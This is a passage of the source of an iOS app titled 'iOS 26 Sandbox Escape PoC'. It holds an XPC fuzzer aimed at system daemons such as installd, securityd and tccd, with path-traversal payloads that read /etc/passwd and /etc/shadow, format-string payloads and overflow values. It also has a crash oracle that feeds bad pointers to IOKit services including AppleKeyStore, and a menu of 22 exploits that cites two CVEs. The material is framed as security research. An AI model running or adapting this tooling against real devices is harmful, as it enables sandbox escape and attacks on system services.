    [log appendString:@"\n[*] Selector enumeration...\n"];
    for (uint32_t sel = 0; sel < 30; sel++) {
        uint64_t dummy[4] = {0};
        uint32_t dummyCnt = 4;
        kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, dummy, &dummyCnt);
        if (kr != 0xe00002c2 && kr != 0xe00002bc) {
            [log appendFormat:@"    [%u] 0x%x\n", sel, kr];
        }
    }

    IOServiceClose(conn);
    IOObjectRelease(surfaceRoot);

    [log appendString:@"\n[*] IOSurface memory operations complete\n"];
    return log;
}

#pragma mark - XPC Targeted Fuzzing

+ (NSString *)runXPCTargetedFuzz {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== XPC Targeted Fuzzing ===\n\n"];

    load_xpc_symbols();
    if (!xpc_loaded) {
        [log appendString:@"[-] XPC symbols not available\n"];
        return log;
    }

    // High-value targets
    NSDictionary *targets = @{
        @"com.apple.installd": @[@"InstallDaemon", @"install", @"path", @"client"],
        @"com.apple.securityd": @[@"SecItemAdd", @"SecItemCopyMatching", @"class", @"query"],
        @"com.apple.tccd": @[@"TCCAccessRequest", @"service", @"client", @"pid"],
        @"com.apple.containermanagerd": @[@"container", @"create", @"identifier", @"class"],
        @"com.apple.lsd.mapdb": @[@"lookup", @"register", @"type", @"handler"]
    };

    for (NSString *service in targets) {
        [log appendFormat:@"\n[*] Fuzzing %@...\n", service];

        xpc_connection_t conn = _xpc_connection_create_mach_service([service UTF8String], NULL, 0);
        if (!conn) {
            [log appendString:@"    [-] Cannot connect\n"];
            continue;
        }

        __block int crashes = 0;
        __block int responses = 0;

        _xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
            if (event == _XPC_ERROR_CONNECTION_INTERRUPTED) crashes++;
            else responses++;
        });
        _xpc_connection_resume(conn);

        NSArray *keys = targets[service];

        // Fuzz test 1: NULL dereference attempt
        xpc_object_t msg1 = _xpc_dictionary_create(NULL, NULL, 0);
        _xpc_dictionary_set_int64(msg1, [keys[0] UTF8String], 0);
        _xpc_dictionary_set_int64(msg1, "pointer", 0x0);
        _xpc_connection_send_message(conn, msg1);

        // Fuzz test 2: Integer overflow
        xpc_object_t msg2 = _xpc_dictionary_create(NULL, NULL, 0);
        _xpc_dictionary_set_int64(msg2, [keys[0] UTF8String], 1);
        _xpc_dictionary_set_int64(msg2, "size", 0xFFFFFFFFFFFFFFFF);
        _xpc_dictionary_set_int64(msg2, "count", -1);
        _xpc_connection_send_message(conn, msg2);

        // Fuzz test 3: Path traversal
        xpc_object_t msg3 = _xpc_dictionary_create(NULL, NULL, 0);
        _xpc_dictionary_set_string(msg3, [keys[1] UTF8String], "../../../../../../etc/passwd");
        _xpc_dictionary_set_string(msg3, "path", "/var/../../../etc/shadow");
        _xpc_connection_send_message(conn, msg3);

        // Fuzz test 4: Format string
        xpc_object_t msg4 = _xpc_dictionary_create(NULL, NULL, 0);
        _xpc_dictionary_set_string(msg4, [keys[2] UTF8String], "%s%s%s%s%s%s%s%s%s%s");
        _xpc_dictionary_set_string(msg4, "name", "%n%n%n%n");
        _xpc_connection_send_message(conn, msg4);

        // Fuzz test 5: Large allocation
        xpc_object_t msg5 = _xpc_dictionary_create(NULL, NULL, 0);
        char largeBuf[4096];
        memset(largeBuf, 'A', sizeof(largeBuf) - 1);
        largeBuf[sizeof(largeBuf) - 1] = 0;
        _xpc_dictionary_set_string(msg5, [keys[3] UTF8String], largeBuf);
        _xpc_connection_send_message(conn, msg5);

        // Fuzz test 6: Deeply nested structure
        xpc_object_t msg6 = _xpc_dictionary_create(NULL, NULL, 0);
        xpc_object_t current = msg6;
        for (int depth = 0; depth < 50; depth++) {
            xpc_object_t inner = _xpc_dictionary_create(NULL, NULL, 0);
            _xpc_dictionary_set_value(current, "nested", inner);
            current = inner;
        }
        _xpc_connection_send_message(conn, msg6);

        [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]];

        [log appendFormat:@"    Responses: %d, Interrupts: %d\n", responses, crashes];
        if (crashes > 0) {
            [log appendFormat:@"    [!] POTENTIAL CRASH DETECTED\n"];
        }

        _xpc_connection_cancel(conn);
    }

    [log appendString:@"\n[*] XPC targeted fuzzing complete\n"];
    return log;
}

#pragma mark - Crash Oracle

+ (NSString *)runCrashOracle {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== Crash Oracle ===\n\n"];

    [log appendString:@"[*] Testing crash-inducing patterns...\n\n"];

    mach_port_t masterPort = kIOMainPortDefault;

    // IOKit crash patterns
    [log appendString:@"[1] IOKit crash patterns:\n"];

    NSArray *dangerousServices = @[@"IOSurfaceRoot", @"AGXAccelerator", @"AppleKeyStore"];

    for (NSString *serviceName in dangerousServices) {
        io_service_t service = IOServiceGetMatchingService(masterPort, IOServiceMatching([serviceName UTF8String]));
        if (service == IO_OBJECT_NULL) continue;

        io_connect_t conn;
        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
        if (kr != KERN_SUCCESS) {
            IOObjectRelease(service);
            continue;
        }

        [log appendFormat:@"    Testing %@:\n", serviceName];

        // Pattern 1: Invalid memory pointer
        uint64_t badPointer = 0xDEADBEEF;
        kr = IOConnectCallScalarMethod(conn, 0, &badPointer, 1, NULL, NULL);
        [log appendFormat:@"        BadPtr: 0x%x\n", kr];

        // Pattern 2: Large size
        uint64_t largeSize = 0xFFFFFFFF;
        kr = IOConnectCallScalarMethod(conn, 0, &largeSize, 1, NULL, NULL);
        [log appendFormat:@"        LargeSize: 0x%x\n", kr];

        // Pattern 3: Negative value
        uint64_t negative = (uint64_t)-1;
        kr = IOConnectCallScalarMethod(conn, 0, &negative, 1, NULL, NULL);
        [log appendFormat:@"        Negative: 0x%x\n", kr];

        // Pattern 4: NULL struct
        kr = IOConnectCallMethod(conn, 0, NULL, 0, (void*)0x1, 0x1000, NULL, NULL, NULL, NULL);
        [log appendFormat:@"        NullStruct: 0x%x\n", kr];

        IOServiceClose(conn);
        IOObjectRelease(service);
    }

    // Mach port crash patterns
    [log appendString:@"\n[2] Mach port patterns:\n"];

    // Invalid port
    mach_port_t invalidPort = 0xDEAD;
    kern_return_t kr = mach_port_deallocate(mach_task_self(), invalidPort);
    [log appendFormat:@"    InvalidPort dealloc: 0x%x\n", kr];

    // Double deallocate attempt (safe - just tests the error)
    mach_port_t testPort;
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &testPort);
    if (kr == KERN_SUCCESS) {
        mach_port_deallocate(mach_task_self(), testPort);
        kr = mach_port_deallocate(mach_task_self(), testPort);
        [log appendFormat:@"    Double dealloc: 0x%x\n", kr];
    }

    // Memory crash patterns
    [log appendString:@"\n[3] Memory patterns:\n"];

    // Try to detect heap state
    void *testAlloc = malloc(1024);
    if (testAlloc) {
        memset(testAlloc, 0x41, 1024);
        free(testAlloc);
        [log appendString:@"    Heap alloc/free: OK\n"];
    }

    // VM operation
    mach_vm_address_t vmAddr = 0;
    kr = mach_vm_allocate(mach_task_self(), &vmAddr, 0x1000, VM_FLAGS_ANYWHERE);
    if (kr == KERN_SUCCESS) {
        // Try to write
        memset((void*)vmAddr, 0x42, 0x1000);
        mach_vm_deallocate(mach_task_self(), vmAddr, 0x1000);
        [log appendString:@"    VM alloc/write/dealloc: OK\n"];
    }

    // Signal handler check
    [log appendString:@"\n[4] Signal handling:\n"];

    // Check if we can catch signals
    struct sigaction oldHandler;
    sigaction(SIGSEGV, NULL, &oldHandler);
    [log appendFormat:@"    SIGSEGV handler: %s\n", oldHandler.sa_handler == SIG_DFL ? "default" : "custom"];

    sigaction(SIGBUS, NULL, &oldHandler);
    [log appendFormat:@"    SIGBUS handler: %s\n", oldHandler.sa_handler == SIG_DFL ? "default" : "custom"];

    // Exception port check
    [log appendString:@"\n[5] Exception ports:\n"];

    exception_mask_t masks[EXC_TYPES_COUNT];
    mach_msg_type_number_t maskCount = EXC_TYPES_COUNT;
    exception_handler_t handlers[EXC_TYPES_COUNT];
    exception_behavior_t behaviors[EXC_TYPES_COUNT];
    thread_state_flavor_t flavors[EXC_TYPES_COUNT];

    kr = task_get_exception_ports(mach_task_self(),
        EXC_MASK_ALL, masks, &maskCount, handlers, behaviors, flavors);
    [log appendFormat:@"    Exception ports query: 0x%x (count=%u)\n", kr, maskCount];

    [log appendString:@"\n[*] Crash oracle complete\n"];
    return log;
}

@end

#pragma mark - View Controller

@interface ViewController : UIViewController <UITableViewDelegate, UITableViewDataSource>
@property (nonatomic, strong) UITableView *tableView;
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) NSArray *exploits;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    
    self.title = @"iOS 26 Sandbox Escape PoC";
    self.view.backgroundColor = [UIColor systemBackgroundColor];
    
    self.exploits = @[
        @{@"title": @"System Info", @"desc": @"Show device information"},
        @{@"title": @"CloudKit Symlink", @"desc": @"CVE-2025-43448 - Symlink escape"},
        @{@"title": @"Assets Bypass", @"desc": @"CVE-2025-43407 - Entitlements"},
        @{@"title": @"cfprefsd XPC", @"desc": @"XPC multi-message exploit"},
        @{@"title": @"Disk Amplification", @"desc": @"Write amplification test"},
        @{@"title": @"Timing Channel", @"desc": @"Side-channel timing test"},
        @{@"title": @"IOKit Probe", @"desc": @"IOKit service enumeration"},
        @{@"title": @"Private APIs", @"desc": @"dlsym private function discovery"},
        @{@"title": @"Kernel Info", @"desc": @"Mach port & task info leaks"},
        @{@"title": @"FD Tricks", @"desc": @"File descriptor exploits"},
        @{@"title": @"XPC Scan", @"desc": @"System XPC service probing"},
        @{@"title": @"IOKit Advanced", @"desc": @"AppleKeyStore, IOSurface, AGX"},
        @{@"title": @"XPC Fuzzing", @"desc": @"Malformed message testing"},
        @{@"title": @"MobileGestalt", @"desc": @"Device info enumeration"},
        @{@"title": @"SpringBoard", @"desc": @"App list & interaction"},
        @{@"title": @"Entitlements", @"desc": @"Privileged operation testing"},
        @{@"title": @"AGX Deep Probe", @"desc": @"GPU driver selector fuzzing"},
        @{@"title": @"KeyStore Exploit", @"desc": @"AppleKeyStore deep exploitation"},
        @{@"title": @"FBS Invoke", @"desc": @"FBSystemService method calls"},
        @{@"title": @"IOSurface Mem", @"desc": @"Surface creation & mapping"},
        @{@"title": @"XPC Target Fuzz", @"desc": @"installd/securityd/tccd fuzzing"},
        @{@"title": @"Crash Oracle", @"desc": @"Crash pattern detection"},
        @{@"title": @"Run All Tests", @"desc": @"Execute all exploits"}
    ];
    
    // Table view for exploits
    self.tableView = [[UITableView alloc] initWithFrame:CGRectZero style:UITableViewStyleInsetGrouped];
    self.tableView.delegate = self;
    self.tableView.dataSource = self;
    self.tableView.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.tableView];
    
    // Log view
    self.logView = [[UITextView alloc] init];
    self.logView.editable = NO;
    self.logView.font = [UIFont fontWithName:@"Menlo" size:11];
    self.logView.backgroundColor = [UIColor secondarySystemBackgroundColor];
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    self.logView.layer.cornerRadius = 8;
    [self.view addSubview:self.logView];
    
    // Layout
    [NSLayoutConstraint activateConstraints:@[
        [self.tableView.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor],
        [self.tableView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [self.tableView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [self.tableView.heightAnchor constraintEqualToConstant:400],
        
        [self.logView.topAnchor constraintEqualToAnchor:self.tableView.bottomAnchor constant:8],
        [self.logView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:16],
        [self.logView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-16],
        [self.logView.bottomAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.bottomAnchor constant:-8]
    ]];
    
    self.logView.text = @"Select an exploit to run...\n\nThis app tests various sandbox escape techniques for iOS 26.1 security research.";
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
    return self.exploits.count;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:@"cell"];
    if (!cell) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:@"cell"];
    }
    
    NSDictionary *exploit = self.exploits[indexPath.row];
    cell.textLabel.text = exploit[@"title"];
    cell.detailTextLabel.text = exploit[@"desc"];
    cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;
    
    return cell;
}

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
    [tableView deselectRowAtIndexPath:indexPath animated:YES];
    
    self.logView.text = @"Running...\n";
    
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSString *result;
        
        switch (indexPath.row) {
            case 0:
                result = [ExploitEngine getSystemInfo];
                break;
            case 1:
                result = [ExploitEngine runCloudKitExploit];
                break;
            case 2:
                result = [ExploitEngine runAssetsExploit];
                break;
            case 3:
                result = [ExploitEngine runCfprefsdExploit];
                break;
            case 4:
                result = [ExploitEngine runDiskAmplificationTest];
                break;
            case 5:
                result = [ExploitEngine runTimingChannelTest];
                break;
            case 6:
                result = [ExploitEngine runIOKitExploit];
                break;
            case 7:
                result = [ExploitEngine runPrivateAPIProbe];
                break;
            case 8:
                result = [ExploitEngine runKernelInfoLeak];
                break;
            case 9:
                result = [ExploitEngine runFileDescriptorTricks];
                break;
            case 10:
                result = [ExploitEngine runXPCServiceScan];
                break;
            case 11:
                result = [ExploitEngine runIOKitAdvancedExploit];
                break;
            case 12:
                result = [ExploitEngine runXPCFuzzing];
                break;
            case 13:
                result = [ExploitEngine runMobileGestaltQueries];
                break;
            case 14:
                result = [ExploitEngine runSpringBoardInteraction];
                break;
            case 15:
                result = [ExploitEngine runEntitlementProbing];
                break;
            case 16:
                result = [ExploitEngine runAGXDeepProbe];
                break;
            case 17:
                result = [ExploitEngine runAppleKeyStoreExploit];
                break;
            case 18:
                result = [ExploitEngine runFBSystemServiceInvoke];
                break;
            case 19:
                result = [ExploitEngine runIOSurfaceMemoryOps];
                break;
            case 20:
                result = [ExploitEngine runXPCTargetedFuzz];
                break;
            case 21:
                result = [ExploitEngine runCrashOracle];
                break;
            case 22: {
                NSMutableString *all = [NSMutableString string];
                [all appendString:[ExploitEngine getSystemInfo]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runCloudKitExploit]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runAssetsExploit]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runCfprefsdExploit]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runDiskAmplificationTest]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runTimingChannelTest]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runIOKitExploit]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runPrivateAPIProbe]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runKernelInfoLeak]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runFileDescriptorTricks]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runXPCServiceScan]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runIOKitAdvancedExploit]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runXPCFuzzing]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runMobileGestaltQueries]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runSpringBoardInteraction]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runEntitlementProbing]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runAGXDeepProbe]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runAppleKeyStoreExploit]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runFBSystemServiceInvoke]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runIOSurfaceMemoryOps]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runXPCTargetedFuzz]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runCrashOracle]];
                result = all;
                break;
            }
            default:
                result = @"Unknown exploit";
        }
        
        dispatch_async(dispatch_get_main_queue(), ^{
            self.logView.text = result;
        });
    });
}

- (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section {
    return @"Available Exploits";
}

@end

#pragma mark - App Delegate

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    
    ViewController *vc = [[ViewController alloc] init];
    UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:vc];
    
    self.window.rootViewController = nav;
    [self.window makeKeyAndVisible];
    
    return YES;
}

@end

#pragma mark - Main

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
